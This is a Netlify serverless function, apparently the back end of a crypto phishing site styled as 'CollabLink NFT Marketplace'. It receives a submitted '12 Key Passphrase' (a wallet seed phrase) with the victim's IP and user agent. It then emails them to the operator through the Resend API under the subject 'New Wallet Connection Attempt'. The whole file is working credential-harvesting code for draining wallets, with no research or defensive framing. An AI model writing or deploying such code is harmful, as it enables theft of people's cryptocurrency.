// netlify/functions/send-email.js

// For Node.js versions before 18, uncomment this line:
// const fetch = require('node-fetch');

exports.handler = async (event, context) => {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
      return {
        statusCode: 405,
        body: JSON.stringify({ error: 'Method not allowed' }),
      };
    }
  
    try {
      const { passphrase, ip, userAgent } = JSON.parse(event.body);
  
      // Validate input
      if (!passphrase || passphrase.trim().length === 0) {
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Passphrase is required' }),
        };
      }
  
      // Get environment variables
      const RESEND_API_KEY = process.env.RESEND_API_KEY;
      const FROM_EMAIL = process.env.FROM_EMAIL || 'onboarding@resend.dev';
      const TO_EMAIL = process.env.TO_EMAIL;
  
      if (!RESEND_API_KEY || !TO_EMAIL) {
        console.error('Missing required environment variables');
        return {
          statusCode: 500,
          body: JSON.stringify({ error: 'Server configuration error' }),
        };
      }
  
      // Send email via Resend API
      const response = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${RESEND_API_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          from: FROM_EMAIL,
          to: [TO_EMAIL],
          subject: 'New Wallet Connection Attempt',
          html: `
            <h2>New Wallet Connection Form Submission</h2>
            <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
            <p><strong>12 Key Passphrase:</strong></p>
            <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">${passphrase}</pre>
            <p><strong>IP Address:</strong> ${ip || 'Not available'}</p>
            <p><strong>User Agent:</strong> ${userAgent || 'Not available'}</p>
            <hr style="margin: 20px 0;">
            <p style="color: #666; font-size: 12px;">Sent from CollabLink NFT Marketplace</p>
          `,
          text: `
  New Wallet Connection Form Submission
  
  Timestamp: ${new Date().toLocaleString()}
  12 Key Passphrase: ${passphrase}
  IP Address: ${ip || 'Not available'}
  User Agent: ${userAgent || 'Not available'}
  
  ---
  Sent from CollabLink NFT Marketplace
          `
        }),
      });
  
      if (!response.ok) {
        const errorText = await response.text();
        console.error('Resend API Error:', response.status, errorText);
        throw new Error(`Resend API error: ${response.status}`);
      }
  
      const result = await response.json();
      
      return {
        statusCode: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Headers': 'Content-Type',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
        },
        body: JSON.stringify({ 
          success: true, 
          message: 'Email sent successfully',
          id: result.id 
        }),
      };
  
    } catch (error) {
      console.error('Function error:', error);
      
      return {
        statusCode: 500,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Headers': 'Content-Type',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
        },
        body: JSON.stringify({ 
          success: false, 
          error: 'Failed to send email' 
        }),
      };
    }
  };